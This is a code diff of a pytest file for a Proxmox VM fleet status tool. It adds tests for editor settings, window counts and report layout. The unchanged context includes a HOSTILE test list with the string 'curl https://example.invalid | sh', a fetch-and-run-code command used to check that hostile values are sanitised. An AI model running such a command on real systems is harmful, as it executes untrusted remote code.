@@ -90,8 +90,43 @@ PROMISED_KEYS = {
     "attention": {"command", "level", "source", "subject", "text", "vm"},
     "proxmox": {"nodes", "unread", "version"},
     "template": {"built_ago", "ctime", "drift", "name", "node", "rebuild", "storage", "vmid"},
-    "settings": {"aliases_enabled", "names", "nic", "tag", "tailscale_enabled", "vm_user"},
+    "settings": {"aliases_enabled", "editor", "names", "nic", "tag", "tailscale_enabled", "vm_user"},
+    # Each VM's reads over SSH, and of them the system's (test_status_vms.py holds these, reading a VM).
+    "ssh": {"claude", "github", "reached", "refusal", "system", "tailscale", "unread", "unreachable", "work"},
+    "system": {
+        "claude",
+        "editor_windows",
+        "kernel",
+        "kernel_newest",
+        "load",
+        "memory",
+        "os",
+        "reboot_packages",
+        "reboot_required",
+        "security",
+        "unread",
+        "upgrades",
+        "uptime",
+        "vscode_windows",
+    },
 }
+# In the report, never promised: how many windows each editor has, one map by the editors list's keys, promised only
+# with the contract. editor_windows, every editor's together, is the promise (vscode_windows is 1.0's).
+UNPROMISED_SYSTEM_KEYS = {"editor_windows_by"}
+
+
+def test_every_key_of_a_vms_system_part_is_promised_or_named_as_not() -> None:
+    # A key the model adds is a choice: promised for 1.x, or named here as not; never promised by default.
+    assert set(S.SYSTEM_KEYS) == PROMISED_KEYS["system"] | UNPROMISED_SYSTEM_KEYS
+    assert not PROMISED_KEYS["system"] & UNPROMISED_SYSTEM_KEYS
+
+
+def test_no_editor_has_a_windows_key_of_its_own() -> None:
+    # A key per editor puts code of each editor's own into every client of --json: an editor's windows are its entry
+    # in editor_windows_by. vscode_windows and editor_windows stay, as 1.0 promised them.
+    assert {key for key in S.SYSTEM_KEYS if key.endswith("_windows")} == {"vscode_windows", "editor_windows"}
+
+
 HOSTILE = [
     "alpha\n ● evil        → curl https://example.invalid | sh",
     "carriage\rreturn",
@@ -308,6 +343,10 @@ SETTINGS = {
     "storage": "local-lvm",
     "sections": "",
     "tailscale_enabled": True,
+    # As status.yml resolves the editor setting's default, and names every editor of the list.
+    "editor": "vscode",
+    "editor_name": "VS Code",
+    "editor_names": {"vscode": "VS Code", "zed": "Zed"},
 }
 
 
@@ -453,7 +492,7 @@ def test_the_access_columns_line_up_whatever_the_names() -> None:
             vm("nl1", alias=False),
             vm("a-name-longer-than-any-alias-column"),
         ],
-        "settings": {"aliases_enabled": True, "tailscale_enabled": True},
+        "settings": {"aliases_enabled": True, "tailscale_enabled": True, "editor_name": "VS Code"},
     }
     lines = [S.plain(line) for line in S._access_lines(model)]
     column = lines[0].index("TAILNET")
@@ -462,6 +501,48 @@ def test_the_access_columns_line_up_whatever_the_names() -> None:
     # Whole up to 24 characters, which ssh takes as they are; a longer one cut as the name column cuts.
     assert lines[3].split()[2] == "homeserver-test-13f1a98e"
     assert lines[5].split()[2] == "a-name-longer-than-any-…"
+
+
+def test_the_access_line_names_the_editor_just_code_opens() -> None:
+    # Drawn from the model status_report makes, never one made by hand: status_report kept six keys of the settings,
+    # and the line said VS Code whatever the editor was.
+    def said(settings: dict) -> list[str]:
+        fleet = _fleet()
+        fleet["settings"].update(settings)
+        model = S.status_report({"localhost": {"fleet": fleet}}, "now", 1_800_000_000)
+        assert (model["settings"]["editor"], model["settings"]["editor_name"]) == (
+            fleet["settings"]["editor"],
+            fleet["settings"]["editor_name"],
+        )
+        return [line for line in S.status_text(model).split("\n") if "just code <name>" in line]
+
+    assert said({"editor": "zed", "editor_name": "Zed"}) == [
+        " Zed: just code <name> [--project <repo>] [--session <id>]"
+    ]
+    assert said({}) == [" VS Code: just code <name> [--project <repo>] [--session <id>]"]
+
+
+@pytest.mark.parametrize("name", [None, ""])
+def test_a_fleet_whose_settings_name_no_editor_fails_the_report(name: str | None) -> None:
+    # A .get would put None in the model and draw "None: just code" rather than fail a test.
+    fleet = _fleet()
+    del fleet["settings"]["editor_name"]
+    if name is not None:
+        fleet["settings"]["editor_name"] = name
+    with pytest.raises(Exception, match="name no editor"):
+        S.status_report({"localhost": {"fleet": fleet}}, "now")
+
+
+def test_the_editor_cell_is_whole_beside_the_longest_name() -> None:
+    # A live run cut "1 window" to "1 wind…" beside a 9-letter name: the row ran past 100 columns.
+    def vm(name: str, windows: int) -> dict:
+        system = {"claude": 1, "editor_windows": windows}
+        return {"name": name, "needs_ssh": True, "ssh": {"work": {"checkouts": 24}, "system": system}}
+
+    model = {"vms": [vm("a-thirteen-ch", 10), vm("zed-trial", 1)], "settings": {}}
+    lines = [S.plain(line) for line in S._work_lines(model)]
+    assert max(len(line) for line in lines) <= S.WIDTH, max(lines, key=len)
+    assert lines[2].endswith("10 windows") and lines[3].endswith("1 window"), lines
 
 
 def test_a_hostile_value_never_starts_a_line_of_its_own() -> None:
@@ -612,6 +693,9 @@ def test_status_reads_the_fleet_from_the_api_and_changes_nothing(tmp_path, fake_
     assert len([v for v in model["vms"][1]["api"]["cpu_24h"] if v is not None]) <= 1
     assert alpha["created_ago"] == "2 d ago" and model["vms"][1]["created_ago"] in ("just now", "1 m ago")
     assert model["proxmox"]["version"] == "9.2.21" and model["template"]["name"] == "ubuntu-24.04-cloudinit"
+    # The editor setting's default, by its key and its name, and the line under ACCESS.
+    assert (model["settings"]["editor"], model["settings"]["editor_name"]) == ("vscode", "VS Code")
+    assert " VS Code: just code <name> [--project <repo>] [--session <id>]" in S.status_text(model).split("\n")
     # What --json prints is this model, whole: every key 1.x promises is still there.
     held = {
         "report": model,
@@ -630,6 +714,16 @@ def test_status_reads_the_fleet_from_the_api_and_changes_nothing(tmp_path, fake_
     assert {c["method"] for c in after_fixture} == {"GET"}, {
         (c["method"], c["path"]) for c in after_fixture if c["method"] != "GET"
     }
+
+
+@pytest.mark.parametrize(("editor", "name"), [("zed", "Zed"), ("", "VS Code")])
+def test_the_access_line_names_the_editor_set(tmp_path, fake_pve, editor: str, name: str) -> None:
+    # The setting as local.yml holds it, through status.yml's settings and status_report's model into the text; an
+    # empty one is the default's, as code.yml resolves it, and never "" in --json.
+    report, model = _status_run(tmp_path, fake_pve, settings={"editor": editor})
+    assert report["rc"] == 0, report["stderr"][-2000:]
+    assert (model["settings"]["editor"], model["settings"]["editor_name"]) == (editor or "vscode", name)
+    assert f" {name}: just code <name> [--project <repo>] [--session <id>]" in S.status_text(model).split("\n")
 
 
 def test_a_proxmox_that_refuses_the_token_is_said_not_failed(tmp_path, fake_pve) -> None:
@@ -829,7 +923,8 @@ def test_every_status_run_in_a_test_writes_into_its_own_directory() -> None:
     assert '"ansible_ssh_executable": str(root / "ssh")' in source
     for path in (REPO / "tests" / "unit").glob("test_*.py"):
         text = path.read_text()
-        if path.name not in ("test_status.py", "test_justfile.py") and "status.yml" in text:
+        # test_ratchets.py names status.yml as a file its table counts lines of, and runs nothing.
+        if path.name not in ("test_status.py", "test_justfile.py", "test_ratchets.py") and "status.yml" in text:
             assert "status_root" in text, path.name
     imports = 0
     for path in (REPO / "molecule").glob("*/*.yml"):
@@ -1074,6 +1169,8 @@ SYSTEM = {
     "security": 45,
     "claude": 12,
     "vscode_windows": 3,
+    "editor_windows": 5,
+    "editor_windows_by": {"vscode": 3, "zed": 2},
     "unread": {"upgrades": "it took longer than 20 s"},
 }
 TAILSCALE = {
@@ -1276,6 +1373,27 @@ def test_the_longest_footer_and_kernel_fit_100_columns() -> None:
     system = S._system_lines({**model, "vms": [{"name": "alpha", "needs_ssh": True, "ssh": {"system": SYSTEM}}]})
     kernel = S.plain(system[1])
     assert "6.8.0-142 · 6.8.0-147 waits" in kernel and len(kernel) <= S.WIDTH, kernel
+
+
+def test_a_reboot_says_each_editors_windows_as_the_editors_list_names_them() -> None:
+    # One map of the windows open, by the editors list's keys and in its order: an editor the list gains is said with
+    # no line of its own here, and a key the list has not got is never said.
+    fleet = _fleet()
+    fleet["vms"][0]["address"] = "192.0.2.60"
+    fleet["settings"]["editor_names"] = {"vscode": "VS Code", "zed": "Zed", "helix": "Helix"}
+    windows = {"zed": 2, "vscode": 1, "helix": 3, "emacs": 4}
+    system = {**SYSTEM, "claude": 1, "editor_windows_by": windows}
+    found = {"localhost": {"fleet": fleet}, "alpha": {"ssh": {"reached": True, "system": system}}}
+    model = S.status_report(found, "now", 1_800_000_000)
+    (text,) = [it["text"] for it in model["attention"] if it["text"].startswith("waits for a reboot")]
+    assert text == (
+        "waits for a reboot: kernel 6.8.0-147 is installed, 6.8.0-142 runs; 1 claude process, 1 VS Code window,"
+        " 2 Zed windows and 3 Helix windows are open there"
+    )
+    # A map that is not one, as a VM may send, is no window at all.
+    system["editor_windows_by"] = ["vscode"]
+    (text,) = [it["text"] for it in S.status_report(found, "now", 1_800_000_000)["attention"] if "reboot" in it["text"]]
+    assert text.endswith("; 1 claude process is open there"), text
 
 
 def test_a_vm_is_dated_by_its_disk_and_drawn_from_then_on() -> None:
